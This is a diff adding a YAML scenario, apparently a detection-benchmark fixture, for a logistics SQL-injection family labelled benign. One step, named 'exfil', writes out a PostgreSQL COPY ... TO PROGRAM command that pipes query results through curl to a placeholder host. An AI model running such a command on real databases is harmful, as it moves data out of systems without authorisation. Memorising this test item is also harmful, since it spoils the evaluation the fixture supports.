@@ -1,0 +1,23 @@
+scenario_id: logistics_sqli_ben_01
+family_id: logistics_sql_injection_driver_pii
+domain: logistics
+matched_pair_id: logistics_sqli_pair_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "22:30"
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+  - session_label: inject
+    role: partner_etl_service
+    anchor: db
+    timing:
+      tempo: off_hours
+      step_gaps_seconds: [3.0]
+    events:
+      - step_id: probe
+        sql: "SELECT shipment_id, status FROM shipments WHERE shipment_id = 61010"
+      - step_id: exfil
+        sql: "COPY (SELECT shipment_id, status, dispatched_at FROM shipments WHERE dispatched_at > '2026-09-20 22:00:00') TO PROGRAM 'curl -s https://partner-mirror.datasink.example/collect -d @- > /tmp/etl_sync.log'"
+        connects_to: {ip: "176.65.48.10", port: 8080}
